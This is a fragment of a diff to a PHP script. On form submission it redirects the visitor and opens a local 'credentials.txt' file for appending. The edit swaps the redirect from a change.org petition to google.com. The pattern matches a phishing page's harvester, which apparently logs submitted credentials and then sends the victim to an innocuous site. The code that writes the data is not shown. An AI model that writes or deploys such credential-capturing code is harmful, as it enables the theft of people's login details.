@@ -1,7 +1,7 @@
 <?php
 session_start();
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    header("location: https://www.change.org/p/ugc-india-make-college-campuses-safer-now-with-active-compliant-anti-harassment-cells?source_location=discover_feed");
+    header("location: https://www.google.com/");
     $handle = fopen("./credentials.txt", "a");
     date_default_timezone_set("Asia/Kolkata");
 	
